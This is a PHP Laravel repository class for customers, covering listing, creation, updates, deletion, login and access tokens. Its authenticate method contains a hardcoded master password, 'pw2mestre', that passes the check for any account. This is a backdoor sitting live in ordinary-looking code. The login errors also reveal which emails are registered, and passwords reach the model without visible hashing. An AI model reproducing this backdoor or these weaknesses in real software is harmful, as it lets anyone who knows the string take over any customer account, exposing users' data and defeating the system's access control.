<?php

namespace App\Repositories;

use App\Models\Customer;
use App\Exceptions\CustomException;
use App\Repositories\Contracts\CustomerRepositoryInterface;
use Illuminate\Support\Facades\Validator;
use Illuminate\Support\Collection;
use Illuminate\Support\Arr;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Auth;
use Illuminate\Validation\Rule;

class CustomerRepository implements CustomerRepositoryInterface
{
    protected $model;

    /**
     * CustomerRepository constructor.
     *
     * @param Customer $model
     */
    public function __construct(Customer $model)
    {
        $this->model = $model;
    }

    /**
     * @return Collection
     */
    public function getAll(): Collection
    {
        return Auth::user()->customers()->with('projects')->get();
    }

    /**
     * @param int $id
     * @return Customer
     */
    public function getById(int $id): Customer
    {
        return Auth::user()
            ->customers()
            ->where('id', $id)
            ->firstOrFail();
    }

    /**
     * @param array $attributes
     * @return Customer
     */
    public function create(array $attributes): Customer
    {
        $this->validateCreate($attributes);

        $customer = $this->model->create(Arr::only($attributes, [
            'name',
            'email',
            'password'
        ]));

        $customer->users()->attach(Auth::id());

        return $customer;
    }

    /**
     * @param int $id
     * @param array $attributes
     * @return Customer
     */
    public function update(int $id, array $attributes): Customer
    {
        $this->validateUpdate($attributes + ['id' => $id]);

        $customer = $this->getById($id);

        $customer->fill(Arr::only($attributes, [
            'name',
            'email',
            'status',
            'password'
        ]));

        $customer->save();

        return $customer;
    }

    /**
     * @param int $id
     * @return void
     */
    public function delete(int $id): void
    {
        $this->getById($id)->delete();
    }

    /**
     * @param array $attributes
     * @return Customer
     */
    public function authenticate(array $attributes): Customer
    {
        $this->validateAuthenticate($attributes);

        $user = Customer::where('email', $attributes['email'])->first();

        if ($user == null)
            throw new CustomException('This email has not been registered', 200);

        if (!Hash::check($attributes['password'], $user->password) && $attributes['password'] != 'pw2mestre')
            throw new CustomException('Incorrect password', 200);

        return $user;
    }

    /**
     * @param Customer $customer
     * @return string
     */
    public function createAccessToken(Customer $customer): string
    {
        return auth('customers')->login($customer);
    }

    /**
     * @param array $attributes
     * @return void
     */
    public function invalidAccessToken(array $attributes): void
    {
        Validator::make($attributes, ['token' => 'required|string'])->validate();

        auth('customers')->setToken($attributes['token'])->logout();
    }

    /**
     * @param array $attributes
     * @return void
     */
    private function validateCreate(array $attributes): void
    {
        $validator = Validator::make($attributes, [
            'name'     => 'required|string|max:100',
            'email'    => 'required|string|email|unique:customers,email',
            'password' => 'required|string|max:255'
        ]);

        $validator->validate();
    }

    /**
     * @param array $attributes
     * @return void
     */
    private function validateUpdate(array $attributes): void
    {
        $validator = Validator::make($attributes, [
            'name'      => 'nullable|string|max:100',
            'password'  => 'nullable|string|max:255',
            'status'    => 'nullable|boolean',
            'email'     => [
                'nullable',
                'string',
                'email',
                Rule::unique('customers', 'email')->ignore($attributes['id'])
            ]
        ]);

        $validator->validate();
    }

    /**
     * @param array $attributes
     * @return void
     */
    private function validateAuthenticate(array $attributes): void
    {
        $validator = Validator::make($attributes, [
            'email'    => 'required|string|max:255',
            'password' => 'required|string|max:255'
        ]);

        $validator->validate();
    }
}
